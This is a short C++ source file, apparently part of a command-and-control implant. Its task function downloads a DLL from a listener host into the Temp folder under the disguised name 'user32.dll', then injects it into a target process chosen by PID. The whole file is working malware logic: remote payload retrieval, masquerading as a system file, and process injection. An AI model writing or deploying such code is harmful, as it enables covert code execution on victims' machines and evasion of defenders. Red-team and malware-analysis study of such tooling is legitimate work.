#include "core/task.hpp"

namespace Task
{
    // Load DLL and spawn modules.
    std::wstring Dll(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Set the DLL file path to inject
        std::wstring wDllDestName = L"user32.dll"; // Impersonate the file name.
        std::wstring wDllDest = System::Env::GetStrings(L"%TEMP%") + L"\\" + wDllDestName;
        size_t dwDllDestSize = (wDllDest.size() + 1) * sizeof(wchar_t);

        // Download a DLL file
        BOOL bResults = System::Http::DownloadFile(
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            wSrc,
            wDllDest
        );
        if (!bResults)
        {
            return L"Error: Failed to download DLL file.";
        }


        // Inject DLL
        bResults = Technique::Injection::DllInjection(dwPid, (LPVOID)wDllDest.c_str(), dwDllDestSize);
        if (!bResults)
        {
            return L"Error: Failed to injection DLL.";
        }

        return L"Success: Dll injected successfully.";
    }
}